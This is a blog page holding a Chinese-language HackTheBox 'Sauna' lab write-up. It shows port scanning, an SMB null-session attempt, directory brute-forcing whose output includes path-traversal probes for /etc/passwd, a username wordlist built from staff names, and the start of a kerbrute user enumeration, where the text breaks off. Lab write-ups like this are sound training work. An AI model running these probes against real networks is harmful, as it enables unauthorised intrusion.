@@ -1,0 +1,748 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="我們都被困在這寂寞的夜晚  陽光照進窗簾卻太過刺眼  靶机ip：10.129.95.180 难度：简单 涉及内容： 开源情报收集 (OSINT) 与自定义字典生成 Kerberos 预认证机制与枚举 (Kerbrute) AS-REP Roasting 攻击 Windows 远程管理 (WinRM) 的利用 Active Directory 枚举与权限路径分析 (BloodHound) Windo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Sauna">
+<meta property="og:url" content="http://example.com/2026/04/30/HackTheBox-Sauna/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="我們都被困在這寂寞的夜晚  陽光照進窗簾卻太過刺眼  靶机ip：10.129.95.180 难度：简单 涉及内容： 开源情报收集 (OSINT) 与自定义字典生成 Kerberos 预认证机制与枚举 (Kerbrute) AS-REP Roasting 攻击 Windows 远程管理 (WinRM) 的利用 Active Directory 枚举与权限路径分析 (BloodHound) Windo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/04/30/HackTheBox-Sauna/msedge_TmnygCi9W0.png">
+<meta property="article:published_time" content="2026-04-30T06:07:28.000Z">
+<meta property="article:modified_time" content="2026-04-30T07:30:16.063Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/04/30/HackTheBox-Sauna/msedge_TmnygCi9W0.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackTheBox-Sauna - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Sauna"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-30 14:07" pubdate>
+          April 30, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackTheBox-Sauna</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>我們都被困在這寂寞的夜晚 </p>
+<p>陽光照進窗簾卻太過刺眼</p>
+<hr>
+<p>靶机ip：10.129.95.180</p>
+<p>难度：简单</p>
+<p>涉及内容：</p>
+<p><strong>开源情报收集 (OSINT) 与自定义字典生成</strong></p>
+<p><strong>Kerberos 预认证机制与枚举 (Kerbrute)</strong></p>
+<p><strong>AS-REP Roasting 攻击</strong></p>
+<p><strong>Windows 远程管理 (WinRM) 的利用</strong></p>
+<p><strong>Active Directory 枚举与权限路径分析 (BloodHound)</strong></p>
+<p><strong>Windows 注册表 AutoLogon 敏感信息泄露</strong></p>
+<p><strong>Windows Logon Session 与 Rubeus 原理分析</strong></p>
+<p><strong>DCSync 攻击与 NTDS.dit 哈希导出</strong></p>
+<p><strong>哈希传递攻击 (Pass-The-Hash)</strong></p>
+<hr>
+<p>端口扫描</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌─[root@htb-hlx1pljzsg]─[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>skyarrow<span class="hljs-operator">/</span>Desktop]<br>└──╼ <span class="hljs-comment">#nmap -p- 10.129.95.180 -sV -sC -T4 -A -O</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>4-<span class="hljs-number">30</span> <span class="hljs-number">01</span>:<span class="hljs-number">09</span> CDT<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">13</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan<br>SYN Stealth Scan <span class="hljs-params">Timing:</span> About <span class="hljs-number">7.72</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">12</span> (<span class="hljs-number">0</span>:<span class="hljs-number">02</span>:<span class="hljs-number">47</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">02</span>:<span class="hljs-number">08</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Service Scan<br>Service scan <span class="hljs-params">Timing:</span> About <span class="hljs-number">20.00</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">11</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">24</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">03</span>:<span class="hljs-number">09</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Script Scan<br>NSE <span class="hljs-params">Timing:</span> About <span class="hljs-number">98.45</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">12</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">03</span>:<span class="hljs-number">41</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Script Scan<br>NSE <span class="hljs-params">Timing:</span> About <span class="hljs-number">90.00</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">13</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">03</span>:<span class="hljs-number">41</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Script Scan<br>NSE <span class="hljs-params">Timing:</span> About <span class="hljs-number">91.25</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">13</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)<br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">95.180</span><br>Host is up (<span class="hljs-number">0.0026</span>s latency).<br>Not <span class="hljs-params">shown:</span> <span class="hljs-number">65515</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span><span class="hljs-symbol">/tcp</span>    open  domain        Simple DNS Plus<br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>    open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span><br>|<span class="hljs-params">_http-title:</span> Egotistical Bank :: Home<br>| <span class="hljs-params">http-methods:</span> <br>|_  Potentially risky <span class="hljs-params">methods:</span> TRACE<br><span class="hljs-number">88</span><span class="hljs-symbol">/tcp</span>    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="hljs-params">time:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>4-<span class="hljs-number">30</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">29</span>Z)<br><span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span>   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span><span class="hljs-symbol">/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP (<span class="hljs-params">Domain:</span> EGOTISTICAL-BANK.LOCAL0., <span class="hljs-params">Site:</span> Default-First-Site-Name)<br><span class="hljs-number">445</span><span class="hljs-symbol">/tcp</span>   open  microsoft-ds<span class="hljs-operator">?</span><br><span class="hljs-number">464</span><span class="hljs-symbol">/tcp</span>   open  kpasswd5<span class="hljs-operator">?</span><br><span class="hljs-number">593</span><span class="hljs-symbol">/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span><span class="hljs-symbol">/tcp</span>   open  tcpwrapped<br><span class="hljs-number">3268</span><span class="hljs-symbol">/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP (<span class="hljs-params">Domain:</span> EGOTISTICAL-BANK.LOCAL0., <span class="hljs-params">Site:</span> Default-First-Site-Name)<br><span class="hljs-number">3269</span><span class="hljs-symbol">/tcp</span>  open  tcpwrapped<br><span class="hljs-number">5985</span><span class="hljs-symbol">/tcp</span>  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)<br>|<span class="hljs-params">_http-title:</span> Not Found<br><span class="hljs-number">9389</span><span class="hljs-symbol">/tcp</span>  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">49667</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49677</span><span class="hljs-symbol">/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49678</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49679</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49692</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49701</span><span class="hljs-symbol">/tcp</span> open  msrpc         Microsoft Windows RPC<br><span class="hljs-params">Warning:</span> OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device <span class="hljs-params">type:</span> general purpose<br>Running (JUST GUESSING): Microsoft Windows <span class="hljs-number">2019</span> (<span class="hljs-number">89</span>%)<br>Aggressive OS <span class="hljs-params">guesses:</span> Microsoft Windows Server <span class="hljs-number">2019</span> (<span class="hljs-number">89</span>%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network <span class="hljs-params">Distance:</span> <span class="hljs-number">2</span> hops<br>Service <span class="hljs-params">Info:</span> <span class="hljs-params">Host:</span> SAUNA; <span class="hljs-params">OS:</span> Windows; <span class="hljs-params">CPE:</span> cpe:<span class="hljs-operator">/</span>o:microsoft:windows<br><br>Host script <span class="hljs-params">results:</span><br>| <span class="hljs-params">smb2-security-mode:</span> <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br>|<span class="hljs-params">_clock-skew:</span> <span class="hljs-number">6</span>h59m59s<br>| <span class="hljs-params">smb2-time:</span> <br>|   <span class="hljs-params">date:</span> <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>4-<span class="hljs-number">30</span>T13:<span class="hljs-number">12</span>:<span class="hljs-number">26</span><br>|_  <span class="hljs-params">start_date:</span> N<span class="hljs-symbol">/A</span><br><br>TRACEROUTE (using port <span class="hljs-number">53</span><span class="hljs-operator">/</span>tcp)<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">1.66</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">2.19</span> ms <span class="hljs-number">10.129</span>.<span class="hljs-number">95.180</span><br><br>OS and Service detection performed. Please report any incorrect results at https:<span class="hljs-operator">//</span>nmap.org<span class="hljs-operator">/</span>submit<span class="hljs-symbol">/</span> .<br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">221.92</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>nxcsmb枚举shares</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌─[root@htb-hlx1pljzsg]─[/home/skyarrow/Desktop]<br>└──╼ #nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span> -u &quot;&quot; -p &quot;&quot; <span class="hljs-comment">--shares</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span>   <span class="hljs-number">445</span>    SAUNA            [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:SAUNA) (<span class="hljs-keyword">domain</span>:EGOTISTICAL-BANK.<span class="hljs-keyword">LOCAL</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">False</span>)<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span>   <span class="hljs-number">445</span>    SAUNA            [+] EGOTISTICAL-BANK.<span class="hljs-keyword">LOCAL</span>\:<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span>   <span class="hljs-number">445</span>    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED<br><br></code></pre></td></tr></table></figure>
+
+<p>目录爆破</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌─[root@htb-hlx1pljzsg]─[<span class="hljs-string">/home/skyarrow/Desktop</span>]<br>└──╼ <span class="hljs-comment">#dirsearch -u http://10.129.95.180/</span><br><br>  _|. _ _  _  _  _ _|_    v0.4.3.post1<br> <span class="hljs-params">(_||| _)</span> <span class="hljs-params">(/_(_|| (_| )</span><br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25<br>Wordlist size: 11460<br><br>Output File: <span class="hljs-string">/home/skyarrow/Desktop/reports/http_10.129.95.180/__26-04-30_01-16-53.txt</span><br><br>Target: http:<span class="hljs-string">//10.129.95.180/</span><br><br>[01<span class="hljs-function">:16</span><span class="hljs-function">:53</span>] Starting: <br>[01<span class="hljs-function">:16</span><span class="hljs-function">:54</span>] 403 -  312B  - /%2e%2e/<span class="hljs-string">/google.com</span><br>[01<span class="hljs-function">:16</span><span class="hljs-function">:54</span>] 403 -  312B  - <span class="hljs-string">/.</span>%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>[01<span class="hljs-function">:16</span><span class="hljs-function">:57</span>] 403 -  312B  - /\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\<span class="hljs-string">..</span>\etc\passwd<br>[01<span class="hljs-function">:16</span><span class="hljs-function">:58</span>] 200 -   30KB - <span class="hljs-string">/about.html</span><br>[01<span class="hljs-function">:17</span><span class="hljs-function">:05</span>] 403 -  312B  - <span class="hljs-string">/cgi-bin/.</span>%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>[01<span class="hljs-function">:17</span><span class="hljs-function">:07</span>] 200 -   15KB - <span class="hljs-string">/contact.html</span><br>[01<span class="hljs-function">:17</span><span class="hljs-function">:07</span>] 301 -  148B  - <span class="hljs-string">/css</span>  -&gt;  http:<span class="hljs-string">//10.129.95.180/css/</span><br>[01<span class="hljs-function">:17</span><span class="hljs-function">:10</span>] 301 -  150B  - <span class="hljs-string">/fonts</span>  -&gt;  http:<span class="hljs-string">//10.129.95.180/fonts/</span><br>[01<span class="hljs-function">:17</span><span class="hljs-function">:11</span>] 301 -  151B  - <span class="hljs-string">/images</span>  -&gt;  http:<span class="hljs-string">//10.129.95.180/images/</span><br>[01<span class="hljs-function">:17</span><span class="hljs-function">:11</span>] 403 -    1KB - <span class="hljs-string">/images/</span><br><br>Task Completed<br><br></code></pre></td></tr></table></figure>
+
+<p>访问about.html，发现人名</p>
+<p><img src="/2026/04/30/HackTheBox-Sauna/msedge_TmnygCi9W0.png" srcset="/img/loading.gif" lazyload></p>
+<p>做成字典</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">┌─<span class="hljs-selector-attr">[root@htb-hlx1pljzsg]</span>─<span class="hljs-selector-attr">[/home/skyarrow/Desktop]</span><br>└──╼ <span class="hljs-selector-id">#cat</span> users<span class="hljs-selector-class">.txt</span> <br>Fergus<br>Smith <br>Shaun<br>Coins<br>Sophie<br>Driver <br>Hugo<br>Bear<br>Bowie<br>Taylor<br>Steven<br>Kerb<br>F<span class="hljs-selector-class">.Smith</span><br>S<span class="hljs-selector-class">.Coins</span><br>S<span class="hljs-selector-class">.Driver</span><br>H<span class="hljs-selector-class">.Bear</span><br>B<span class="hljs-selector-class">.Taylor</span><br>S<span class="hljs-selector-class">.Kerb</span><br>FSmith<br>SCoins<br>SDriver<br>HBear<br>BTaylor<br>SKerb<br><br></code></pre></td></tr></table></figure>
+
+<p>kerbrute跑一下</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌─[root@htb-hlx1pljzsg]─[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>skyarrow<span class="hljs-operator">/</span>Desktop]<br>└──╼ <span class="hljs-comment">#./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc EGOTISTICAL-BANK.LOCAL users.txt </span><br><br>__             __               __<br><br>   <span class="hljs-symbol">/</span> <span class="hljs-symbol">/_____</span>  _____<span class="hljs-symbol">/</span> <span class="hljs-symbol">/_</span>  _______  __<span class="hljs-symbol">/</span> <span class="hljs-symbol">/____</span> <br>  <span class="hljs-symbol">/</span> <span class="hljs-operator">//</span>_<span class="hljs-symbol">/</span> _ \<span class="hljs-symbol">/</span> ___<span class="hljs-symbol">/</span> __ \<span class="hljs-symbol">/</span> ___<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> __<span class="hljs-symbol">/</span> _ \<br> <span class="hljs-symbol">/</span> ,<span class="hljs-operator">&lt;</span> <span class="hljs-symbol">/</span>  __<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>  __<span class="hljs-symbol">/</span><br><span class="hljs-operator">/</span>_<span class="hljs-operator">/</span>|_|\___<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>  <span class="hljs-operator">/</span>_.___<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>   \__,_<span class="hljs-operator">/</span>\__<span class="hljs-operator">/</span>\___<span class="hljs-symbol">/</span>                                        <br><br><span class="hljs-params">Version:</span> v1.<span class="hljs-number">0.3</span> (<span class="hljs-number">9</span>dad6e1) <span class="hljs-operator">-</span> <span class="hljs-number">04</span><span class="hljs-symbol">/30/26</span> <span class="hljs-operator">-</span> Ronnie Flathers @ropnop<br><br><span class="hljs-number">2026</span><span class="hljs-symbol">/04/30</span> <span class="hljs-number">01</span>:<span class="hljs-number">27</span>:<span class="hljs-number">09</span> <span class="hljs-operator">&gt;</span>  Using KDC(s):<br><span class="hljs-number">2026</span><span class="hljs-symbol">/04/30</span> <span class="hljs-number">01</span>:<span class="hljs-number">27</span>:<span class="hljs-number">09</span> <span class="hljs-operator">&gt;</span>  	EGOTISTICAL-BANK.LOCAL:<span class="hljs-number">88</span><br><br><span class="hljs-number">2026</span><span class="hljs-symbol">/04/30</span> <span class="hljs-number">01</span>:<span class="hljs-number">27</span>:<span class="hljs-number">09</span> <span class="hljs-operator">&gt;</span>  [<span 